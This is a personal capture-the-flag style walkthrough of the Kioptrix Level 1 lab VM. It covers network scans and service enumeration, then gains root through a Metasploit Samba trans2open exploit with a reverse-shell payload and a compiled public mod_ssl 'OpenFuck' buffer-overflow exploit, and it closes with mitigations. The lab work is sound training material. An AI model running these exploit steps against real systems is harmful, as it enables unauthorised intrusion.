
# 1. Challenge Overview
1. Challenge name: Kioptrix level 1
2. Discerption: This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges
3. Date release: 17 Feb 2010
4. Attempted Date: 10/5/2025
5. Solved Date: 17/5/2025
6. Category:
	1. [ ] Web
	2. [ ] Crypto
	3. [x] Pwn
	4. [ ] Reversing
	5. [ ] Forensics
7. Operating System:
	1. [x] Linux
	2. [ ] Windows
8. Difficulty Level:
	1. [x] Easy
	2. [ ] Medium
	3. [ ] Hard
9. Goal:
	1. [ ] Flag
	2. [x] root
10. Setup:
	1. download the machine from reputable sources to avoid malicious files: [vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
	2. Extract the Virtual Machine Files: it contains .vmdk (virtual disk) file and a .vmx (virtual machine configuration) file
	3. Import the Virtual Machine into VMware Workstation:
		1. Go to "File" > "Open..."
		2. Navigate to the folder where you extracted the Kioptrix Level 1 files
		3. Select the .vmx file and click "Open."
	4. Configure Network Settings Depends On Your Needs:
		1. Host-Only Networking (Recommended for isolated testing)
		2. NAT
		3. Bridged Networking (Not recommended for isolated testing)
	5. start the machine

- in my case I'm going to use Bridge because my attacker and victim machine are separated physically and my network is already isolated from the internet so bridge is fine for me
- default username and password is: root/root
# 2. The Method

## 1. Pre-Exploit:
### 1. Recon:
Before we start to do our scans we need to discover the IP of our target so I'm going to use Netdiscover

``` bash
netdiscover -r 192.168.1.0/24
```

1. **-r**: to scan range of IPs

Here are the results that back to us

``` bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 8 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 480               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     bc:25:e0:8a:21:bc      2     120  HUAWEI TECHNOLOGIES CO.,LTD 
 192.168.1.6     78:e4:00:bf:86:aa      1      60  Hon Hai Precision Ind. Co.,L
 192.168.1.2     ea:93:80:97:ee:34      1      60  Unknown vendor              
 192.168.1.101   00:c0:ca:28:fc:57      1      60  ALFA, INC.                  
 192.168.1.103   78:e4:00:bf:86:aa      2     120  Hon Hai Precision Ind. Co.,L
 192.168.1.100   dc:a2:66:62:6a:b5      1      60  Hon Hai Precision Ind. Co.,L


```

Our target is: `192.168.1.6`

After we discovered the target let us start to preform nmap scan for the target I'm going to start with initial nmap scan

 1. initial nmap scan:

``` bash
nmap -sC -sV -O -oA nmap-output-initial 192.168.1.6
```

1. **-sC**: run default nmap scripts
2. **-sV**: detect service version
3. **-O**: detect OS
4. **-oA**: output all formats and store in file _nmap-output-initial_

 Here are the result of the initial nmap scan:

``` bash
Nmap 7.95 scan initiated Mon Mar 17 22:10:54 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -O -oA namp-output-initial 192.168.1.6
Nmap scan report for 192.168.1.6
Host is up (0.042s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32776/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2025-03-18T00:11:03+00:00; +4h59m46s from scanner time.
|_http-title: 400 Bad Request
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 78:E4:00:BF:86:AA (Hon Hai Precision Ind.)
Device type: WAP|broadband router
Running: Linux 2.4.X, Belkin embedded, Inventel embedded, Telekom embedded, USRobotics embedded, ZTE embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/h:belkin:f5d7633 cpe:/h:inventel:livebox cpe:/h:telekom:sinus_1054 cpe:/h:usr:sureconnect_9105 cpe:/h:zte:zxdsl_831
OS details: Belkin F5D7633, Inventel Livebox, or T-Sinus 1054 wireless broadband router; or USRobotics SureConnect 9105 or ZTE ZXDSL 831 ADSL modem
Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 4h59m45s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 17 22:11:17 2025 -- 1 IP address (1 host up) scanned in 23.18 seconds

```

So we have the following ports are opened:
1. **port 22**: running OpenSSH 2.9p2
2. **port 80 and 443**: running Apache httpd 1.3.20
3. **port 139**: running netbios-ssn Samba smbd
4. **port 111**: running rpcbind
5. **port 32768**: I do not know what is that

Before we doing our investigation for the previous open ports let us do a full nmap scan so we do not miss any other ports


2. full nmap scan:

``` bash
nmap -sC -sV -p- -oA nmap-output-full 192.168.1.6
```

1. **-sC**: run default nmap scripts
2. **-sV**: detect service version
3. **-p-**: all ports
4. **-oA**: output all formats and store in file _nmap-output-full_


We did not find anything more so now let us move to scan UDP ports

3. UDP nmap scan:

``` bash
nmap -sU -p 0-1000 -oA nmap-output-udp 192.168.1.6
```

1. **-sU**: for UDP
2. **-p-**: all ports
3. **-oA**: output all formats and store in file _nmap-output-udp_

Here are the result of the first 1000 ports nmap scan:

``` bash

└─$ nmap -sU -p 0-1000 -oA nmap-output-udp-1000 192.168.1.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 03:31 +03
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.86% done; ETC: 03:37 (0:06:08 remaining)
Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 13.92% done; ETC: 03:45 (0:12:28 remaining)
Nmap scan report for 192.168.1.6
Host is up (0.0036s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
111/udp open          rpcbind
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
775/udp open|filtered acmaint_transd
MAC Address: 78:E4:00:BF:86:AA (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 962.06 seconds

```

So we have the following ports are opened:
1. **port 111**: running rpcbind
2. **port 137**: running netbios-ns
3. **port 138 (open | filtered)**: running netbios-dmg
4. **port 775 (open | filtered)**: running acmaint_transd


Finally let us do a mental note about the nmap scan results to determine our possible entry point and arrange the ports to start with the low hanging fruit:
1. port 139: it is the easiest port to test so I'm going to start with it first
2. port 80: web is usually have a lot of things too test so it maybe can be our entry point so I will test it after port 139
3. port 22: usually do not have much things to test so it going to be the last to check

### 2. Enumeration:
#### first we are going to enumerate port 139:
first identify the version of samba using metasploit use what ever you like if you have any external script go with it no problem:
1. open metasploit: `msfconsole`
2. search for the auxiliray module: `search smb-version`
3. use the module: `use auxiliary/scanner/smb/smb_version`
4. to see the options required: `show options`
5. the only required option is the target IP: `set RHOST 192.168.1.6`
6. run the module: `run` or `exploit`

we got the version: `Unix (Samba 2.2.1a)`

now we are going to search for any vulnerabilities for that version using google and exploit-db or you can use `searchsploit` command:

I am going to use `searchsploit Samba 2.2.1a`
i found it vulnerable to a vulnerability called trans2open which is a remote buffer overflow that affect a function called trans2open (CVE-2003-0201) which accept user supplied input without checking the size of the input and there is a metasploit module to exploit it:
``` bash
searchsploit Samba 2.2.1a

Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)
```

so after enumerate port 139 we got back a valid exploit and this is maybe our entry point

now let us enumerate the rest of ports to see if we can find another entry point or not

#### enumerate port 80 /  443 

first let us navigate to the http and https version of 192.168.1.6:

http:

![[192.168.1.6 port 80 web browser.png]]

we got apache default page no thing interesting

https:

![[192.168.1.9 port 443 web .png]]

no thing interesting in the https version

let us try to find any hidden folders using `gobuster`:
``` bash
gobuster dir -u http://192.168.1.6:80 -b 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

1. **-u**: your target url
2. **-b**: exclude 404 pages only 
3. **-w**: wordlist
4. **dir**: directory module

here is the result of gobuster we did not get anything useful:

``` bash
gobuster dir -u http://192.168.1.6:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.6:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
Progress: 94672 / 220561 (42.92%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 94762 / 220561 (42.96%)
===============================================================
Finished
===============================================================
```

now here is a thing if you remember in the nmap results we got the version of apache and the version of openssl library and mod_ssl so let us try to find if there is any vulnerabilities associated with it:
```
Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
```

for apache I didn't find any thing useful

for mod_ssl which is an apache cryptographic module that depend on openssl library and it is an old version and after a basic search in google i found it vulnerable to a buffer overflow which named openfuck (CVE-2002-0082) and there is a C exploit for it but no metasploit module for it

here is a confirmation from nikto

``` bash
nikto -h http://192.168.1.6

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.6
+ Target Hostname:    192.168.1.6
+ Target Port:        80
+ Start Time:         2025-05-12 19:50:13 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 06:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
/usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

let us continue

#### enumerate port 22:
if you remember we got the version of SSH in the nmap result which was `OpenSSH 2.9p2` so let us confirm it using netcat:

``` bash
nc -nv 192.168.1.6 22 

(UNKNOWN) [192.168.1.6] 22 (ssh) open
SSH-1.99-OpenSSH_2.9p2

```

indeed we got the same result back so we are now going to search for any vulnerabilities that associated with this version

i didn't find anything useful for SSH

now let's try to to login with root and no password but before that let us confirm if it use password-based authentication using namp or you can simply use `ssh root@<target>` if it prompt you to enter password so its enabled:

``` bash
nmap -p 22 --script ssh-auth-methods 192.168.1.6

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 17:36 +03
Nmap scan report for 192.168.1.6
Host is up (0.073s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|_    keyboard-interactive
MAC Address: 78:E4:00:BF:86:AA (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds

```

and as you see its enabled so we can now try to SSH with root and no password 

and it didn't work now we can try to brute-force it but I will not go to this path now instead I'm going to exploit the samba and mod_ssl vulnerabilities and that what we are going to do in the exploit phase next

### 3. Exploit
as we saw in the pervious phase there is to possible foothold for us and I'm going try to exploit them:

#### 1. samba trans2open:
let us start up the metasploit to exploit:
1. open metasploit: `msfconsole`
2. search for the auxiliray module: `search trans2open`
3. use the module: `use exploit/linux/samba/trans2open`
4. to see the options required: `show options`
5. the only required option is the target IP: `set RHOST 192.168.1.8`
6. run the module: `run` or `exploit`

``` bash
[*] 192.168.1.9:139 - Trying return address 0xbfff9bfc...
[*] 192.168.1.9:139 - Trying return address 0xbfff9afc...
[*] 192.168.1.9:139 - Trying return address 0xbfff99fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff98fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff97fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff96fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff95fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff94fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff93fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff92fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff91fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff90fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff8ffc...
[*] 192.168.1.9:139 - Trying return address 0xbfff8efc...
^C[-] 192.168.1.9:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf6 exploit(linux/samba/trans2open) >

```

for some reason it keep looping

I have discovered the problem I didn't open the metasploit port in the kali firewall

I got another problem but this time the payload was not set properly so you have to use the following generic payload `payload/generic/shell_reverse_tcp` 

``` bash
msf6 exploit(linux/samba/trans2open) > sessions -i 6
[*] Starting interaction with 6...

ls
whoami
root
hostname
kioptrix.level1

```

![[kioptrix rooted via samba trans2open .png]]

yay we got a root shell back :) pwned successfully through samba trans2open exploit

now let's move to the second path to root the machine

#### 2. mod_ssl openfuck:

there is no metasploit module for it but there is a 3 C exploit available on exploit-db so we are going to see which one we will use:


``` bash
searchsploit openfuck

---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow              | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)        | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)        | unix/remote/47080.c
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Sadly none of them actually work :( for some reason it didn't compile

``` bash
  50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
47080.c:798:17: warning: â€˜MD5_Finalâ€™ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  798 |                 MD5_Final(km,&ctx);
      |                 ^~~~~~~~~
/usr/include/openssl/md5.h:51:27: note: declared here
   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);
      |                           ^~~~~~~~~
47080.c: In function â€˜generate_session_keysâ€™:
47080.c:807:9: warning: â€˜RC4_set_keyâ€™ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  807 |         RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
      |         ^~~~~~~~~~~
/usr/include/openssl/rc4.h:35:28: note: declared here
   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
      |                            ^~~~~~~~~~~
47080.c:811:9: warning: â€˜RC4_set_keyâ€™ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  811 |         RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
      |         ^~~~~~~~~~~
/usr/include/openssl/rc4.h:35:28: note: declared here
   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
```

after a search on google I found a modified version of openfuck here is the code:

[openfuck updated github](https://github.com/heltonWernik/OpenLuck)

1. install libssl-dev: `apt install libssl-dev`
2. you must compile it: `gcc -o OpenFuck OpenFuck.c -lcrypto`
3. run the exploit: `./OpenFuck 0x6b 192.168.1.9 443 -c 50` the `0x6b` for the apache version `Red Hat Linux, using apache version 1.3.20`

![[kioptrix level 1 rooted via modssl openfuck.png]]

luckily we got a root shell successfully

### 4. Summary And Chain Of Vuln That We Used
1. **Samba trans2open Buffer Overflow (CVE-2003-0201)**:
    
    - **Mitigation**: Update Samba to a patched version or disable unused services.
        
2. **mod_ssl OpenSSL Buffer Overflow (CVE-2002-0082)**:
    
    - **Mitigation**: Upgrade OpenSSL and mod_ssl to versions without known vulnerabilities.
